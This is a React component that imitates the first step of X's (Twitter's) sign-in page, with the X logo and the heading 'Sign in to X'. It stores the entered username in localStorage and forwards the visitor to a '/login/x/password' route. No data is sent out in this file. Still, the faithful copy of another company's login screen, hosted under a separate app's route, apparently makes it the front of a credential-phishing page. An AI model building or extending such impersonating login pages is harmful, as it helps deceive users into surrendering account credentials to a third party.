import { useState } from "react";
import xLogo from "../assets/x-logo.png";

export default function XLogin() {
  const [username, setUsername] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);

  async function nextStep(e) {
    e.preventDefault();

    if (!username.trim()) {
      setError(true);
      return;
    }

    setError(false);

    localStorage.setItem("x_username", username);

    setLoading(true);

    setTimeout(() => {
      setLoading(false);
      window.location.href = "/login/x/password";
    }, 600);
  }

  return (
    <div className="min-h-screen bg-black flex items-center justify-center px-6">

      <div className="w-full max-w-sm">

        <div className="flex justify-center mb-8">
          {/* Your custom logo goes here */}
          <img
            src={xLogo}
            alt="X"
            className="w-14 h-14 object-contain"
          />
        </div>

        <h1 className="text-white text-3xl font-bold mb-8">
          Sign in to X
        </h1>

        <form onSubmit={nextStep} className="space-y-5">

          <input
            type="text"
            placeholder="Phone, email or username"
            value={username}
            onChange={(e) => {
              setUsername(e.target.value);
              if (error) setError(false);
            }}
            className={`w-full rounded-md border bg-black px-4 py-4 text-white outline-none focus:border-blue-500 ${
              error ? "shake-error border-red-500" : "border-gray-700"
            }`}
          />
          {error && <p className="text-sm text-red-500">Please enter your username, email or phone.</p>}

          <button
            type="submit"
            disabled={loading}
            className="w-full rounded-full bg-white text-black font-bold py-3 hover:bg-gray-200 transition"
          >
            {loading ? "Loading..." : "Next"}
          </button>

        </form>

      </div>

    </div>
  );
}